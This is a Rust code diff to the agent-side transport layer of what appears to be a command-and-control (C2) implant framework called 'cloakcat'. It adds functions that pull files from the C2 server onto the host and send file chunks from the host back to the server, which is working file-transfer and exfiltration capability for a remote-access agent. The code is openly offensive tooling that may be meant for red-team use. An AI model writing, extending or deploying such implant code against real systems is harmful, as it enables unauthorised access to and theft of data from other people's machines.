@@ -3,7 +3,7 @@
 use std::env;
 
 use anyhow::Result;
-use cloakcat_protocol::{ListenerProfile, RegisterReq, RegisterResp, ResultReq};
+use cloakcat_protocol::{FileChunk, ListenerProfile, RegisterReq, RegisterResp, ResultReq};
 use reqwest::Client;
 
 /// Defines how the agent communicates with the C2 server.
@@ -18,6 +18,12 @@ pub trait Transport {
 
     /// Upload a command result.
     async fn send_result(&self, url: &str, token: &str, req: &ResultReq) -> Result<()>;
+
+    /// Fetch assembled file bytes for an upload task.
+    async fn fetch_upload_file(&self, url: &str, token: &str) -> Result<Vec<u8>>;
+
+    /// Send a single download chunk to the server.
+    async fn send_download_chunk(&self, url: &str, token: &str, chunk: &FileChunk) -> Result<()>;
 }
 
 /// HTTP transport backed by reqwest.
@@ -84,6 +90,37 @@ impl Transport for HttpTransport {
             let status = resp.status();
             let text = resp.text().await.unwrap_or_default();
             anyhow::bail!("status={} body={}", status, text);
+        }
+        Ok(())
+    }
+
+    async fn fetch_upload_file(&self, url: &str, token: &str) -> Result<Vec<u8>> {
+        let resp = self
+            .client
+            .get(url)
+            .header("X-Agent-Token", token)
+            .send()
+            .await?;
+        if !resp.status().is_success() {
+            let status = resp.status();
+            let text = resp.text().await.unwrap_or_default();
+            anyhow::bail!("fetch_upload_file: status={} body={}", status, text);
+        }
+        Ok(resp.bytes().await?.to_vec())
+    }
+
+    async fn send_download_chunk(&self, url: &str, token: &str, chunk: &FileChunk) -> Result<()> {
+        let resp = self
+            .client
+            .post(url)
+            .header("X-Agent-Token", token)
+            .json(chunk)
+            .send()
+            .await?;
+        if !resp.status().is_success() {
+            let status = resp.status();
+            let text = resp.text().await.unwrap_or_default();
+            anyhow::bail!("send_download_chunk: status={} body={}", status, text);
         }
         Ok(())
     }
